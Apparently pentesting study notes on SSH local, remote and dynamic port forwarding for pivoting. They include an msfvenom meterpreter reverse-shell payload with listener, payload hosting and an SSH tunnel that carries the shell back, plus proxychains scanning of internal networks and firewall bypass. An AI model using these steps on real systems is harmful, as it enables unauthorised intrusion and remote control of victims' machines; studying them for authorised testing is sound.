Port forwarding is a networking technique that redirects network traffic through an SSH tunnel, allowing access to services that are not directly reachable from the attacker machine.

---

## Local Port Forwarding

- **Definition**: Opens a port on the attacker machine and forwards traffic through the SSH pivot host to a service reachable from the victim network. The destination host is resolved from the perspective of the SSH server.
    
- **Use Case**: Accessing an internal service running on the compromised host or inside its internal network.
    

```bash
ssh -L [attacker_port]:[victim_host]:[victim_service_port] user@pivot_host
```

Meaning:

- `attacker_port` → Port opened locally on the attacker machine
    
- `victim_host` → Host reachable from the pivot machine
    
- `victim_service_port` → Target service port inside the victim network
    

### Forwarding Multiple Ports

Multiple local tunnels can be created within the same SSH session.

```bash
ssh -L [attacker_port1]:[victim_host1]:[victim_service_port1] \
    -L [attacker_port2]:[victim_host2]:[victim_service_port2] \
    user@pivot_host
```

---

## Remote Port Forwarding

- **Definition**: Opens a port on the pivot host and forwards incoming connections back to a service running on the attacker machine.
    
- **Use Case**: Exposing a local attacker service (listener, reverse shell, web server) to systems that can reach the pivot host.
    

```bash
ssh -R [pivot_port]:[attacker_host]:[attacker_service_port] user@pivot_host
```

Meaning:

- `pivot_port` → Port opened on the pivot host
    
- `attacker_host` → Usually localhost from attacker perspective
    
- `attacker_service_port` → Service running on attacker machine

### Gaining a Reverse Shell from an unreachable host

In segmented networks, a target system may not have a route to the attacker machine due to firewall rules or network isolation. However, the target can often communicate with an internal pivot host. By using remote port forwarding, the pivot host exposes a reachable port that transparently tunnels reverse connections back to the attacker listener through SSH, allowing reverse shells even when direct connectivity is impossible.


#### Creating a Reverse Payload

Generate a payload configured to connect to the pivot host instead of the attacker machine:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
lhost=[pivot_internal_ip] \
lport=[pivot_listen_port] \
-f exe -o payload.exe
```

#### Starting a Listener on the Attacker Host

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport [attacker_listener_port]
run
```

The listener waits locally for connections that will arrive through the SSH tunnel.

#### Uploading the Payload to the Pivot Host

```bash
scp payload.exe user@[pivot_host]:~/
```


#### Hosting the Payload from the Pivot

```bash
python3 -m http.server [web_port]
```

This allows internal targets to download the payload from the pivot system.

#### Remote / Reverse Port Forwarding (SSH -R)

```bash
ssh -R [pivot_listen_ip]:[pivot_listen_port]:[attacker_ip]:[attacker_listener_port] \
user@[pivot_host] -vN
```

#### Traffic Flow

```
Target → Pivot Host (listening port)
        → SSH tunnel
        → Attacker listener
```

From the attacker perspective, the connection often appears as coming from `127.0.0.1` because it arrives through the local SSH socket.

---

## Dynamic Port Forwarding

- **Definition**: Creates a SOCKS proxy on the attacker machine that dynamically routes traffic through the pivot host to internal network targets.
    
- **Use Case**: Network pivoting, internal scanning, or routing tools through an SSH tunnel.
    

```bash
ssh -D [attacker_socks_port] user@pivot_host
```

### How It Works

The SSH client opens a local SOCKS listener on the attacker machine. Any application configured to use this proxy sends its traffic to the local port, which is then securely forwarded through the SSH connection and routed by the pivot host to reachable internal networks.

### Firewall Considerations

Dynamic port forwarding is commonly used to bypass network segmentation and firewall restrictions. Since traffic is encapsulated inside an outbound SSH connection (usually allowed on port 22), internal firewalls may treat the traffic as trusted communication originating from the pivot host.

### Proxy Configuration

To route tools through the tunnel, a proxy-aware wrapper such as **proxychains** can be used.

Add the SOCKS proxy to the configuration file:

```bash
/etc/proxychains.conf

socks5 127.0.0.1 [attacker_socks_port]
```

### Example Usage

Scanning an internal network through the pivot host:
```bash
proxychains nmap -sT -Pn 172.16.5.0/24
```

Connecting to an internal service:
```bash
proxychains xfreerdp /v:172.16.5.19
```